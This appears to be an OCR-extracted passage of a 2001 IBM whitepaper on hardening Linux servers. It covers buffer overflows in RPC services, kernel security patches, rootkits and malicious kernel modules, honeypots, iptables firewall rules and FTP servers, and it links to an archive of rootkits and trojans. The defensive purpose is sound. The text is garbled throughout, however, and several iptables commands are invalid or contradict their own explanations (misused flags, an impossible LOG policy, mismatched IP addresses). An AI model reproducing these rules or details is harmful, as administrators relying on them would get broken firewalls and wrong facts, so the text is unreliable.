+    © IBM. Corp. 2001. All rights reserved.'
+  merge: -1
+  pgno: 15
+- img_proc: true
+  md: '# Buffer overflows in RPC services
+
+
+    A buffer overflow occurs when an attacker overflows an application buffer with
+    data and "infects" the process stack. The process stack holds the address of the
+    next instruction to be executed (the return address). To exploit a buffer overflow,
+    it is necessary to replace the return address of function with the shell code
+    to execute (shell code typically being the location of /bin/sh, or a set-UID root
+    code of /bin/sh hidden somewhere on the system). This shell code is inserted into
+    the body buffer, followed by its address in memory. This essentially gets a shell
+    onto the system. If the application was a set-UID root program, then the attacker
+    now has a root shell on the system.
+
+
+    Buffer overflows in RPC Services, as described on the SANS/FBI list:
+
+
+    +   "Remote procedure calls (RPCs) allow programs on one computer to execute programs
+    on a second computer. They are widely used to access network services as NFS sharing
+    and NIS. Multiple vulnerabilities caused by RPC are being actively exploited.
+    It is compelling the majority of distributed service attacks launched during 1999
+    and early 2000 were executed by systems that had been victimized through the RPC
+    vulnerabilities. The broadly successful attack on U.S. military systems during
+    the Solar incident also exploited an RPC flaw found on hundreds of Defense systems."
+
+
+    These are typically RPC services, such as rpc.tdbserver (ToolTalk), rpc.cmsd (Calendar
+    Manager), rpc.statd (stat). A good way to protect these types of services from
+    being exploited is to block the RPC port (port 111) and the “loopback” ports 32770-32789
+    (TCP and UDP).
+
+
+    Obviously, any buffer overflow in a set-UID root program can be catastrophic.
+    Again, for set-UID/GID root programs as described above, and consider using chatter+
+    on programs that need to be set-UID/GID root. Additionally applications can be
+    compiled against products such as StackGuard (http://www.immunix.org). StackGuard
+    detects and defeats buffer overflow attacks by protecting the return address on
+    the stack from being altered. StackGuard places a "canary" word next to the return
+    address when the function returns, then if the address has been altered an attack
+    has been detected, and the program reports by emitting an alert in syslog, and
+    then halts. Alternative is to use Libsafe (http://www.avalayabs.com/project/libsafe/index.html),
+    which does not need to be compiled with any program, but simply installed as a
+    dynamic library and defined as an environment variable (LD_PRELOAD) or specified
+    in /etc/ld.so.preload. Libsafe is also under GPL.
+
+
+    > 10 Each time a function is called, arguments are copied to the function get
+    area of memory called the "stack". Virtually all CPU architectures use the notion
+    of a stack and have a special register (the stack pointer) and operations for
+    pushing and popping things off the stack. There is also an operator that takes
+    an address of the stack and copies it into the program counter, the register that
+    determines the address of the next instruction to execute. A function calls the
+    return address onto the stack.
+
+    11 For a detailed walk-through of buffer overflows, see: http://www.enderunix.org/documents/gid/buffer-overflow.txt'
+  merge: -1
+  pgno: 16
+- img_proc: true
+  md: '# Kernel level security
+
+
+    If you or your customers have security requirements on the high end of the continuum,
+    they may want to consider securing Linux at the kernel. The majority of the solutions
+    discussed in this document address Linux security at the user space level, but
+    there are known exploits of Linux modules that give it tremendous opportunity
+    for damage, as well as creating a deeply insulated blanket of protection. The
+    defense against these types of low-level attacks is to patch the kernel itself,
+    or to implement specialized Linux modules designed for security.
+
+
+    # Open Source Kernel Security
+
+
+    LIDS (http://lids.org)
+
+    IDS (Intrusion Detection System) is a kernel patch and administrative tools to
+    enhance Linux security. LIDS implements access controls (ACLs) that will help
+    prevent even those with access to the superuser account from wreaking havoc on
+    a system. ACLs allow LIDS to protect files as well as processes.
+
+
+    +   - Protection of files. No one, including root, can modify the LIDS-protected
+    files. Files can be hidden.
+
+    - Protection of process. No one, including root, can kill the protected process.
+    Processes can be hidden.
+
+    - Fine-grained Access Control with ACLs.
+
+    - Use and extend capability to control the whole system.
+
+    - Security alert from the kernel.
+
+    - Port scanner detector in kernel.
+
+
+    SecurityFocus has an excellent tutorial on LIDS at:
+
+    http://www.security.com/infocus/1496. The LIDS-FAQ is also a useful resource for
+    learning about LIDS: http://www.clubinux.org/lids/
+
+
+    SELinux (http://www.nsa.gov/selinux & http://opensource.nailabs.com/selinux/)
+
+    National Security Agency (NSA) Security-Enhanced Linux (SELinux) implements powerful,
+    effective, and fine-grained mandatory access controls for Linux. These controls
+    can be used to confine processes (including superuser) to least privilege, protect
+    the integrity and confidentiality of processes and data, and to support protected
+    systems. SELinux is available under the GPL.
+
+
+    The NSA chose SELinux as a platform for this work of its open environment. It
+    is important to note that SELinux (nor LIDS) does not correct any flaws in Linux,
+    but serves as an example of how mandatory access controls, including superuser
+    access, can be added to Linux. Using SELinux, it is possible to configure a system
+    that meets a number of security objectives as role-based access.
+
+
+    The latest public release of the new SELinux prototype uses the Linux Security
+    Modules (LSM) kernel patch available from Immunix (http://lsm.immunux.org). The
+    SELinux prototype is available on the NSA SELinux Web site. The LSM kernel patch
+    provides'
+  merge: -1
+  pgno: 17
+- img_proc: true
+  md: '# IBM
+
+
+    general security hooks in the Linux kernel and is being jointly developed by several
+    different security projects.
+
+
+    # Commercial Secure OS Products
+
+
+    Argus Systems PitBull (http://www.argus-systems.com/product/overview/pitbull/)
+    PitBull Foundation is Argus’ core Intrusion Prevention software module. Based
+    upon trusted operating system, it moves the fundamental security layer down to
+    the operating system, where decisions are made about access to file systems, devices
+    and processes. PitBull features include: removal of superuser privileges through
+    least privilege mechanism, breaking down supervisor into many privileges; Mandatory
+    Access Control; Isolated Compartments; Enhanced Identification and Auditing. PitBull
+    is ITSEC certified. For details on the PitBull foundation, see http://www.argus-systems.com/product/white_paper/pitbull/oss/3.shtml.
+
+
+    HP Secure OS for Linux (http://www.hp.com/security/linux/) HP Secure OS for Linux
+    offers intrusion prevention, real-time protection against attacks, and damage
+    containment. The Following White Paper discusses the Secure OS for Linux technical
+    details, including the security content model, system configuration lockdown,
+    secure event auditing, file system integrity, and secure applications: http://www.hp.com/products/linux/papers/techbrief/hp-tlx-brief.pdf.
+
+
+    # Alternative Linux-based operating systems, and pre-configured Linux distributions
+
+
+    Owl (http://www.openwall.com/Owl/) “Owl” (or Open GNU/*/Linux) is a security-enhanced
+    operating system with Linux and GNU software is its core, compatible with other
+    distributions of GNU/*Linux. It is intended as a proactive source code “auditing”
+    security methodology, see http://www.openwall.com/Owl/CONCEPTTS.shtml for details
+
+
+    Immunix (http://www.immunux.org/) Immunix System 7 is an Immunix-enabled RedHat
+    Linux 7 distribution and suite of application-level security tools. It has been
+    with the latest Immunix StackGuard enhancements to the gcc compiler and Immunix
+    FormatGuard enhancements to the glibc libraries. Also included are the Immunix
+    SubDomain kernel module and OpenWall kernel patch for audit. Immunix System 7
+    is a commercial product.
+
+
+    EnGuard Linux (http://www.engardlinux.org) EnGuard Secure Linux is a commercial
+    product that offers a secure distribution of Linux that implements advanced security
+    techniques. It includes a variety of features targeted service providers, such:
+
+
+    +   - Robust host and network Intrusion Detection using Web-based Tripwire host
+
+    - Detailed network statistics and system detail reporting
+
+    - Web-based tape backup facility'
+  merge: -1
+  pgno: 18
+- img_proc: true
+  md: '# IBM Gateway
+
+
+    +   * Built-in Network Firewall Running enabling Internet connection sharing and
+
+    NAT support protects users from outside intruders
+
+    * Track network activity, proactively monitor corporate activity
+
+    * Secured Web-based FTP server
+
+
+    Trustix Secure Linux (http://www.trustix.net/
+
+    Trustix Linux is a Linux distribution aimed towards the server market. The innovation
+    that Trustix offers is primarily selecting services based on their security record,
+    and disabling any un-trusted services, such as telnet. By default, Trustix has
+    no services running, relying on the system administrator to activate the services
+    required in the order of their server.
+
+
+    Kaladix (http://www.kaladix.org/
+
+    Pre-configured Linux distribution designed for security. Examples of features
+    include:
+
+
+    +   * Pre-installed security tools, such as map
+
+    * DNS: BIND 8.2.4 running UID/GID in chroot jail
+
+    * MAIL: Postfix 2010228 Patchlevel 02 running UID/GID postfix in chroot jail
+
+    * FTP: VSFTTPED OpenBSD
+
+    * Snort IDS and SPADE anomaly detector UID/GID snort (spade) in separated chroot
+    jail
+
+    * Almost nothing SUID root
+
+    * Quota support
+
+
+    It is important to carefully consider implementing an enhanced or alternative
+    Linux kernel. The consideration should be given to a pre-configured Linux distribution
+    designed for security, as it may or may not meet your server requirements, or
+    be cost effective (i.e., determine the cost you or your customer installed the
+    same types of configurations). Many of these pre-configured “secure distributions”
+    should be viewed as pre-configured knowledge rather than different technologies
+    or products as they are usually built on well-known distributions like Red Hat,
+    SuSE, etc. The enhancements may be effective against many types of Linux exploits
+    and vulnerabilities, but the choice needs to be balanced with the limitations
+    imposed by a customized Linux implementation and how that may affect the application
+    requirements of your customer.
+
+
+    # Know Your Enemy
+
+
+    If you know the enemy and yourself, you need not fear the result of a hundred
+    battles. If you know yourself but not the enemy, for every victory you gained
+    will also suffer a defeat. Sun Tzu “The Art of War"
+
+
+    A successful security model includes a solid understanding of the enemy or the
+    “black hat” community – including their tools, practices, and methodologies. Simply
+    put, you can’t defend against what you can’t identify. The faster and more effective
+    you can identify the enemy, the more likely your systems will be able to defend
+    against an attack.'
+  merge: -1
+  pgno: 19
+- img_proc: true
+  md: '# IBM
+
+
+    # Rootkits
+
+
+    An intruder’s first goal is to maintain a compromised system by covering their
+    tracks. One of the most commonly used attackers for doing this is the “rootkit.”
+    A rootkit usually contains “trojaned”12 system utilities, such as find, ssh, telnet,
+    netstat, is, killall, and ps. Additionally rootkits contain other analysis and
+    detection tools, such as sniffers, spoofing and cleaning scripts, as well keylogger
+    programs to capture passwords and other confidential information. The primary
+    intent of a rootkit is to give the attacker the ability to return to the compromised
+    system at a later date without being discovered. An intruder achieves this secrecy
+    by relying on a system administrator to trust the output of various programs.
+    Most “netstat” to display network connections and “ls” to list all files in a
+    directory. The attacker hides and covers their tracks by modifying these programs
+    to prevent them from displaying their activities. Therefore, “netstat” is altered
+    to display the attacker’s network connections. “ls” is modified to display the
+    attacker’s files and programs. Essentially, these programs are trojans of what
+    the administrator is expecting. This seemingly simple proves to be effective.
+    A system administrator has no clue anything is wrong, and even if they “sense”
+    something is erroneous they will have difficulty down the problem since the tools
+    they would use to analyze a problem are likely trojaned.
+
+
+    The Linux Rootkit (Lrk) is the most common and famous rootkit for exploiting Linux
+    systems. Lrk, and other rootkits and Trojan programs, can be found at: http://ftp.ftp.technotronic.com/unix/trojans/
+    Researching rootkits is an excellent way to know your understanding of them, and
+    what sort of files and programs you want to periodically scan or detect on your
+    system. For example, Lrk uses default files specified at compile time under the
+    /dev directory (/dev/pty,/dev/ptyq,/dev/ptydev/ptyp) to identify itself network
+    connections, files, and processes which it will ignore or drop (i.e., which should
+    be discarded). Understanding this allows you to customize defenses, as an intrusion
+    detection system, to alert the administrator when these files appear, change,
+    or “show up” in an abnormal manner (such as in strange on ps or ls). A decent
+    intrusion detection system (see Appendix) will include services that constantly
+    monitor binaries and network interfaces on a system, and alerts when it believes
+    they have been compromised. To learn more about rootkits, “Understanding the Attackers
+    Toolkit” at http://www.sans.org/infosec/FAQ/toolkit.htm.
+
+
+    Malicious Loaded Kernel Modules (LKMs)
+
+    The Linux kernel supports a concept called Loadable Kernel Modules (LKMs). Normally,
+    if one wanted to add or modify code in a Linux kernel, they would modify the relevant
+    source files to the kernel tree and recompile the kernel. But through loaded kernel
+    modules, you could also add to the Linux kernel while it is running. Typically,
+    LKMs are one of four things: device drivers, filesystem drivers, network drivers,
+    or system functions. LKMs are part of the kernel and can be thought of as “extensions.”
+    LKMs allow developers to write programs that dynamically load
+
+
+    > “trojaned” programs are malvolent replacements for normally benign applications.
+    A term derived, from the Trojan horse which the Greek’s “gifted” to their enemies,
+    the Trojans in Homer’s Iliad.'
+  merge: -1
+  pgno: 20
+- img_proc: true
+  md: "# IBM\n\nthe kernel, either via direct command (such as loading via “insmod”\
+    \ and removing “rmmod”), or through the kernel daemon (kerneld)¹³ There are a\
+    \ variety of advantages to using loadable kernel, for further information on LKMs\
+    \ see http://www.linuxdoc.org/HOWTO/Module-HOWTO/. As LKMs provide access to the\
+    \ entire system, they introduce significant security concerns.\n\nA security compromise\
+    \ at the kernel can grant privileges to an attacker unequaled other types of vulnerabilities.\
+    \ Moreover, once a kernel has been compromised, a skilled cracker can make little\
+    \ themselves and their actions untraceable. Attackers have also deployed roots,\
+    \ such as Knark, Rkit, and Adore, which are similar to those described above and\
+    \ automatically install malicious LKMs to further extend their capabilities for\
+    \ exploiting and hiding on a system. Because of this, it is critical to install\
+    \ essential countermeasures and methods of detection to prevent your system from\
+    \ getting to this state. The following are some recommended considerations for\
+    \ detecting and defending against malicious LKMs.\n\n+   * If you do not need\
+    \ loadable module support, disable LKMs and avoid the potential risk altogether.\
+    \ Although writing directly to /dev/kmem is a possible method for inserting malicious\
+    \ code¹⁴ disabling LKMs will obstruct most automated or unskilled kernel attempts.\
+    \ Loadable module is configured during a kernel build by defining the CONFIG_MODULES\
+    \ parameter (y/n).\n* Strong intrusion detection systems with integrity checks\
+    \ are a good first step.\n* Consider security related patches in Appendix at the\
+    \ end of this page for recommendations.\n* Malicious LKM detection programs such\
+    \ as:\n    * Fontainebleau's Carbonite tool (http://www.foundstone.com/rdlas/prodesc/carbonite.html)\
+    \ provides information about all running processes, those hidden by Knark and\
+    \ other LKM rootkits, by “ps” and “top” at the kernel level. While Knark can hide\
+    \ processes from the normal commands and logging tools, examining the raw /proc\
+    \ directory gives administrators a complete view of all systems.\n* S0Project2000\
+    \ KSTAT (http://www.s0fpj.org) Kernel Security Threat Anti Tools. KSTAT utilities\
+    \ read through /dev/kmem and interface-kernel memory to look for intruders. For\
+    \ example, the “s” option of KSTAT reads and prints out the memory addresses of\
+    \ all systems dev/kmem. If the address does not match what System.map, a warning\
+    \ message is issued.\n* Rksan (http://www.hsc.fr/resources/utils/rksan/index.html)\
+    \ is a kernel-based rootkit scanner for Linux, it detects Adore (v0.14, v0.2b\
+    \ and v0.24) and Knark (v.59).\n\n> ¹³ You can determine which module a kernel\
+    \ has running by the “lsmod” command.\nhttp://www.big-net.au/~-silvio/runtime-kernel-kmem-patching.txt\n\
+    \n> ¹⁴ [Footnote reference]\n\nCopyright IBM. Corp. 2001. All rights reserved.\n\
+    \n- 22 -"
+  merge: -1
+  pgno: 21
+- img_proc: true
+  md: '# IBM
+
+
+    +   ○ Use digital signatures Gnu to validate the authenticity of modules you intend
+    to load or distribute. GnuPG (described in Appendix) is a useful tool for encrypting
+    data and creating digital signatures.
+
+
+    For further information on LKM rootkits and security measures see:
+
+    http://www.sans.org/infosecFAQ/threats/rootkits.html and
+
+    columns tech talk.shtml
+
+    http://www.infosecuritymag.com/articles/april01/
+
+
+    # Honeypots
+
+
+    A "honeypot" is a server connected to outside the DMZ that acts as a decoy, luring
+    potential attackers in order to study their activities and monitor how they are
+    able to break into a system. Honepots are designed to imitate systems that an
+    intruder would like to break into but limit the intruder from having access to
+    an entire network – in other words, it is a Trojan horse that you control. If
+    a honeypot is successful, the intruder will have no idea that they are on a bogus
+    system and being monitored. However, honepots are installed inside firewalls that
+    can be tightly controlled. By restricting what comes into a server from the Internet,
+    the firewall allows all traffic to come from the Internet to lure your entry into
+    an environment where they can do not harm B) you can monitor their activities,
+    tools, and intrusion to learn what they are trying to exploit and improve your
+    own defenses from this knowledge. Honepots are but one tool for a security infrastructure
+    and should not be considered a single form of protection, or a replacement for
+    other security measures such as an IDS. Furthermore, as it is designed to lure
+    to your servers, honepots are not practical for all businesses and skillsets.
+    Design and implementation of a honeypot in your production infrastructure should
+    be carefully considered and deployed and managed by security experts.
+
+
+    The Honeynet Project (http://project.honeynet.org/project.html) is a non-profit
+    research group of security professionals dedicated to security research. Their
+    goal is to learn the tools, techniques, and motives of the blackhat community
+    and to share these learned lessons. All of the Honeynet''s work is OpenSource
+    and shared with the security community. The primary tool for their research is
+    the Honeypot (http://project.honeynet.org/papers/honeypot/). Another article on
+    building Virtual Honeypets is found at http://www.securityfocus.com/cgi-bin/infocus.pl?id=1506.
+    I highly recommend the content of the Honeypot Project as it provides real world
+    experience from the top of security experts in the field.
+
+
+    LaB (http://www.threenorm.com/LaB) is a program that creates a honeypot or "tarpit."
+    LaB takes unused IP addresses on a network and creates "virtual machines" that
+    answer to connection attempts. LaB answers those questions in a way that causes
+    the machine to get stuck, sometimes for a very long time. LaB is currently being
+    used to trap many of the recent vulnerabilities, such as CodeRed, Nimda, and Pentagon.
+    LaB is under the GPL and can be a useful addition to a service provider security
+    infrastructure, providing a proactive tool for worm protection.'
+  merge: -1
+  pgno: 22
+- img_proc: true
+  md: '# Linux Firewalls
+
+
+    One of the significant advantages of the Linux 2.4 kernel is the addition of stateful
+    packet headers via iptables also known as NetFilter. Prior to iptables, the 2.2
+    version of the kernel used the ipchains application to provide firewall service.
+    Although ipchains is very useful, the addition of stateful packet filtering brings
+    Linux 2.4 into the functionality of enterprise class firewall products. The significant
+    difference between iptables and ipchains allows for stateful packet inspection
+    – in other words, an iptables based firewall can maintain a stateful awareness
+    of packets as they attempt to communicate through the system. This allows iptables
+    to make decisions on network messages in a sequence pattern, and identify and
+    act on points in that sequence when a packet triggers the iptables packet filter.
+
+
+    # What is a packet filter?
+
+
+    A packet filter is software which looks at packet headers as they pass through
+    the system (which contains data such as source and destination IP address, port,
+    flags, etc.), and decides what to do with the entire packet. The packet filter
+    might decide to deny the packet (discard the packet as if it had never received
+    it), accept the packet (let the packet pass through), or reject the packet (like
+    deny, but inform the source of the packet that it has rejected). Under Linux,
+    packet filtering is built into the kernel as a kernel module.
+
+
+    Below is a high level diagram of how a packet traverses the iptables filter “lifecycle":
+
+
+    +   Inbound packets
+
+
+    ![](img/bfe6ea110ea710ed0e76c993ed104f90_23_0.png)
+
+
+    The first step is a “routing decision” made by the kernel (with iptables) based
+    on the destination of the inbound packet. If the packet is for this server, the
+    kernel passes the packet down to the INPUT chain. If the packet passes the INPUT
+    chain, it is processed by any local processes listening for this data (applications,
+    servers, etc.).
+
+
+    If the kernel has IP forwarding enabled and the packet has a destination address
+    for a different network interface, the packet is passed to the FORWARD chain.
+    If it passes the FORWARD chain (passing the ACCEPT rules in that chain) it is
+    sent out. If the kernel'
+  merge: -1
+  pgno: 23
+- img_proc: true
+  md: '# IBM
+
+
+    does not have forwarding enabling the packet does not have a destination address
+
+    this server, it is dropped.
+
+
+    If the "Local processing" programs can send network packets (which is typically
+    thencase), these packets are sent through the OUTPUT chain. If the packet is ACCEPTED
+
+    the OUTPUT chain, it is then sent outbound to its specified interface.
+
+
+    Here is a quick start to iptables. Determine if iptables is installed. Try to
+    load thentip tables with modprobe and then grep it through the ismod (list modules)
+
+    function:
+
+
+    ```
+
+    [root@mordor nazgul~$15] modprobe ip_iptables
+
+    [root@mordor nazgul~$15] ismod | grep ip_iptables
+
+    iptables          10496 4 [iptable_nat bytes]
+
+    ```
+
+
+    The last line shows that "iptables" is loaded, the size is "10496" bytes, it’s
+    "use count"
+
+    is "4"^15 and of the list of referring modules, in this case "iptable_nat" and
+    "iptable_filter".
+
+    The information displayed by ismod is identical to that available from /proc/modules.
+
+
+    To display command line options for iptables, simply type "iptables -h". Simply
+    put,
+
+    t iptables command inserts and deletes rules from the kernel''s packet filtering
+    table.
+
+    Note: it is recommended to be at the console of your server when making firewall
+    changes, so that in the examples below, it is easy to deny yourself remote access
+
+    with a misconfigured rule or type.
+
+
+    The following example shows a simple rule to disable inbound TCP traffic:
+
+
+    ```
+
+    /bin/iptables -A INPUT -p tcp -s syn -j DROP
+
+    ```
+
+
+    This will allow your Linux server to communicate outbound TCP, drops all inbound
+
+    TCP packets. However, in a typical provider scenario, the Linux server will need
+
+    to have inbound TCP communication from other servers - usually in the service
+
+    provider’s DMZ or from internal network. In this scenario, it is
+
+    recommended to identify the other servers by IP address and the service or port
+
+    need to access (such as SSH, or HTTP) on our Linux server.
+
+
+    To allow specific rules to communicate with SSH to our server:
+
+
+    ```
+
+    /bin/iptables -A INPUT -p tcp --s 192.168.1.10/32 --destination-port 22 -j ACCEPT
+
+    /bin/iptables -A INPUT -p tcp -s syn -j DROP
+
+    ```
+
+
+    This allows only 192.168.1.110 to communicate to our server, and only via port
+    22
+
+    (which is a secure shell service typically bound to port 22). You could also use
+
+    syn for your destination port, instead of the actual port number, such as:
+
+
+    ^15 All downloadable modules have a "use count" that is used by the system to
+    determine when it is safe to unload
+
+    module. The convention in client drivers is to increment the use count when a
+    device is opened, and
+
+    decrement the count when a device is closed.
+
+
+    © Copyright IBM. Corp. 2001. All rights reserved.'
+  merge: -1
+  pgno: 24
+- img_proc: true
+  md: "```\n/bin/iptables -A INPUT -p tcp -syn 192.168.1.110/32 -destination-port\
+    \ ssh -j ACCEPT\n```\n\n...\\or\n/bin/iptables -A INPUT -p tcp -syn 192.168.1.110/32\
+    \ -destination-port - -j ACCEPT\n\nA typical firewall configuration is to restrict\
+    \ server access to HTTP (for Web and Application services) and SSH (for secure\
+    \ administrative access). Here is an example of firewall for setting this up (192.168.1.101\
+    \ is the IP address of the server):\n\n```\n/bin/iptables -P INPUT DROP\n/bin/iptables\
+    \ -A INPUT -s 0/0 -d 192.168.1.101 -p tcp -destination-port - -j ACCEPT\n/bin/iptables\
+    \ -A INPUT -s 0/0 -d 192.168.1.101 -p tcp -destination-port ssh -j ACCEPT\n/bin/iptables\
+    \ -P INPUT DROP\n/bin/iptables -P INPUT LOG\n```\n\nThis flexibility of Linux\
+    \ allows us to firewall each server so that only necessary ports/services are\
+    \ be accessed to the network. The same type of configuration could be applied\
+    \ to a Java application service, such as WebSphere, running on a separate server,\
+    \ or that the firewall permits only port that are accessed to WebSphere (such\
+    \ as 9080, 9443, etc.). By restricting ports and services to the services that\
+    \ needs to be accessed on a specific server, the service provider can control\
+    \ the potential for numbers one and four on General Vulnerabilities SAN/FS (\"\
+    Default OS/Application Installation\" and \"Large Number of Open Ports\", respectively).\
+    \ Additionally, a similar approach could be taken to mitigate the risks to the\
+    \ number five Vulnerability (LPDP (remote protocol daemon)), by firewalling any\
+    \ Linux print servers to allow port 515 (the TCP port listed for print requests)\
+    \ only to trusted machines. As print servers are not often involved in the service\
+    \ provider server environment, it is recommended to disable iptables any Linux\
+    \ server not designed for handling remote print services as described in the General\
+    \ Practices above.\n\nAnother common usage in the service provider space is blocking\
+    \ individual IP addresses. For numerous reasons, when you publicly available servers,\
+    \ your system will be visited, attacked at the worst, by non-customer related\
+    \ traffic. With iptables, you can create a rule for each individual IP address,\
+    \ but this can become an administrative headache as the number of IP addresses\
+    \ you wish to block increases. One simple way to create a \"firewall.banned\"\
+    \ file with the list of the IPs you want to block in all outindividual access.\
+    \ This file can be modified without having to add/delete/edit your iptables rules\
+    \ or rc.firewall scripts. The following loop would be added to your rc.firewall\
+    \ script, which would read the firewall.banned list and create rules automatically\
+    \ for each IP for the specified $EXTERNAL_INTERFACE variable:\n\n```\nif [ -f\
+    \ /etc/firewall/firewall.banned ]; then\n  while read BANNED; do\n    iptables\
+    \ -A INPUT -i $EXTERNAL_INTERFACE -s $BANNED -j DROP\n    iptables -A INPUT -i\
+    \ $EXTERNAL_INTERFACE -d $BANNED -j DROP\n    iptables -A OUTPUT -o $EXTERNAL_INTERFACE\
+    \ -s $BANNED -j DROP\n    iptables -A OUTPUT -o $EXTERNAL_INTERFACE -d $BANNED\
+    \ -j DROP\n  done < < /etc/firewall/firewall.banned\n```"
+  merge: -1
+  pgno: 25
+- img_proc: true
+  md: '# IBM
+
+
+    For more on creating rc.firewall scripts, and to see a variety of examples, go
+    to: http://www.linuxguruz.org/iptables/16
+
+
+    # Identification and Testing
+
+
+    There are multiple tools to verify proper firewall configuration and which ports
+    and services are open and exposed on your servers. A widely used and well tested
+    tool is nmap, available at: http://www.insecure.org/nmap/
+
+
+    Nmap ("Network Mapper") is an Open Source utility for network exploration or security
+    auditing – often referred to as a "port scanner", it actually provides a wealth
+    of information. Nmap uses IP packets in innovative ways to determine what hosts
+    are available on the network, what services (ports) they are offering, what operating
+    system (and OS version) they are running, what type of packet filters/firewalls
+    are in use, and dozens of other characteristics. Nmap runs on most types of computers,
+    and both console and graphical versions are available (see image below). Nmap
+    is free software, available with full source code under the terms of the GNU GPL.
+    An example of NMap Front End is shown below.
+
+
+    > 16 Using iptables at the command line is good for testing and debugging, but
+    these configuration parameters are stored in the kernel which it will be lost
+    on reboot. To ensure your firewall is configured correctly on each boot, you need
+    to include your rules in an initialization script, typically called "rc.firewall"
+    and placed in the /etc/rc.initialization script. For more on how to create rc.firewall
+    scripts see: http://people.unix-fix.org/andreasson/iptables-tutorial/iptables-tutorial.html'
+  merge: -1
+  pgno: 26
+- img_proc: true
+  md: '# # IBM
+
+
+    ![](img/bfe6ea110ea710ed0e76c993ed104f90_27_0.png)
+
+
+    For OS scanning assumed that 22 is open and 1 is closed and are neither firewalled
+
+    Interesting ports on fanggorn (192,168,123,110):
+
+    (The 1541 ports scanned, but not shown below are in state: closed)
+
+    | Port | State | Service (RPC) |
+
+    | 22/tcp | open | ssh |
+
+    | 23/tcp | open | telnet |
+
+    | 80/tcp | open | http |
+
+    | 111/tcp | open | sunprpc |
+
+    | 139/tcp | open | netbios-ssn |
+
+    | 445/tcp | open | smux |
+
+    | 993/tcp | open | unknown |
+
+    | 1024/tcp | open | icda |
+
+    No exact OS matches for host. (if you know what OS is running on it, see: http://www.insecre.org/cgi-bin/nmap-submit.cgi).
+
+    TCP/IP fingerprint:
+
+    Info(v2.5,BETA30P-1608-linux-gnu;window=12;TTL=19%Time=32170E9%00-22-2I)
+
+
+    Nmap Print End (nmapfe)
+
+
+    Sendip(http://earth.le/projectpurple/sendip) is a handy command line utility for
+    sending arbitrary packets (RIP, TCP, UDP, ICMP or raw IPv4 and IPv6). It allows
+    you to your iptables rules by, for example, sending an ICMP spoofing source. Sendip
+    is also under the GPL.
+
+
+    Another Source firewall utility is Firewall Tester (http://packetstorm.deceptions.org/UNIX/firewall/fester-0.tar.gz).
+    This package consists of two simple Perl scripts, a client and a daemon. The client
+    injects custom packets, while the daemon listens for them. The comparison of the
+    script''s log files permit the detection of filtered packets and consequently
+    filtering rules if the two scripts are ran on different sides of a firewall. Additional
+    security tools which can test and audit the effectiveness of your firewall will
+    be listed below in the Appendix section.'
+  merge: -1
+  pgno: 27
+- img_proc: true
+  md: "# IBM\n\nIt is recommended to understand Iptables (or Ipchains, for that matter)\
+    \ thoroughly before attempting to configure your filter rules. Generally speaking,\
+    \ using the command line to modify and tune your firewall configuration is one\
+    \ of the best ways to do this. However, it is also worth noting there are several\
+    \ applications and freely available tools which allow for easier configuration\
+    \ and management of an iptables firewall. For a simple configuration, from a Red\
+    \ Hat distribution you can simply type “setup” from the command line and select\
+    \ “Firewall Configuration\", which allows you to configure some generic parameters,\
+    \ as displayed below:\n\n![](img/bfe6ea110ea710ed0e76c993ed104f90_28_0.png)\n\n\
+    Other Ipchains/Iptables firewall configuration and management tools include:\n\
+    \n+   - Firewall Builder (http://www.fwbuilder.org)\n  Firewall Builder consists\
+    \ of an object-oriented GUI and a set of policy compilers for various firewall\
+    \ platforms.\n- Shoreline Firewall (http://www.shoreline.net/\n  Customizable\
+    \ configuration files, monitoring, and rasterized sample configurations for common\
+    \ firewall implementations.\n- Firewall Design Tool (http://www.linux-firewall-tools.com/linux/firewall/index.html)\n\
+    \  A clever application for building a firewall, currently supports ipchains,\
+    \ ipfwadm and ipfw, will generate a shell script containing your firewall configuration.\n\
+    - MonMath’s Iptables (http://t245.dydns.org/~monmotha/firewall/index.php)\n  Easily\
+    \ configured script.\n- PHP Firewall Generator (http://phpfwgen.sourceforge.net/)"
+  merge: -1
+  pgno: 28
+- img_proc: true
+  md: '# IBM
+
+
+    The PHP Firewall Generator is a simple PHP script that generates a firewall script
+    for iptables or iptchains firewalls. The script is created based on configuration
+    rules entered by the user.
+
+
+    Iptables can be a complex subject and building sophisticated rules for an iptables
+    firewall is beyond the scope of this document. I have included references in the
+    Resources section for diving deeper into iptables.
+
+
+    # Linux FTP Servers
+
+
+    FTP servers are commonly used in the service provider market. Although HTTP has
+    made large inroads in remote file distribution, FTP is likely the foremost method
+    for software distribution. Many of the security risks with FTP are very similar
+    to telnet (clear text passwords, potential "man in the middle" attacks, etc.),
+    and there are a variety of solutions for securing FTP which can vary significantly
+    on how the Linux FTP server is to be used. Below are recommended practices based
+    on the type of FTP service your customer needs to provide.
+
+
+    # Non-Anonymous FTP
+
+
+    Non-anonymous FTP means that your FTP servers are accessed by a specified list
+    of users. There is a straightforward decision in this scenario - use SSH. Since
+    early 2000, SSH2 includes sftp (http://www.ssh.com). The official SSH2 implementation
+    is a commercially licensed product, and provides a variety of enhancements and
+    support. There is also a GPL requirement for SSH, which includes sftp, available
+    via OpenSSH (http://www.openssh.com). Sftp performs all operations over an encrypted
+    SSH transport. It can also use many features of SSH, such as key authentication
+    and compression. However, sftp requires a user account at the ftp server, so it
+    is not applicable to server deployments that need to operate anonymously.
+
+
+    # Anonymous FTP
+
+
+    Many servers need to be "anonymous" as they need to provide and/or upload file
+    to the general public, or at least a group of users they cannot specify with non-anonymous
+    FTP accounts. Anonymous FTP is a common requirement in the service provider. If
+    your customer needs to run an anonymous FTP server, it is widely suggested to
+    use the CERT configuration guidelines (http://www.cert.org/cert_tips/anonymous_ftp_config.html),
+    as well as the General Server suggestions below.
+
+
+    # Recommended FTP Servers
+
+
+    vsFTPD, "Very Secure FTP" (ftp://ferret.linux.org.uk/pub/linux/vsftpd/) is a ground-up
+    FTP implementation, designed for security.. vsFTPD also includes the ability to
+    throttle bandwidth by preventing the FTP link from being saturated. vsFTPD is
+    used by some well known servers, such as ftp.redhat.com
+
+
+    ProFTP is another alternative for customers looking for robust anonymous FTP server
+    functionality on Linux (http://www.proftpd.org). ProFTP is under GPL and only
+    version'
+  merge: -1
+  pgno: 29
+- img_proc: true
+  md: '# IBM
+
+
+    1.2.0rc3 or greater should be used. ProFTPD is the FTP server used for many volume,
+    Linux-based anonymous FTP servers, such as ftp-kernel.org (the definitive FTP
+    site for Linux), SourceForge,GNU.org, and Frontier, a Linux-based service provider
+    in the UK which hosts, among others, ftp.linux.co.uk and www.linux.co.uk. Read
+    the ProFTPD FAQ (http://www.proftpd.net/docs/faq/proftpdfaq.html) to determine
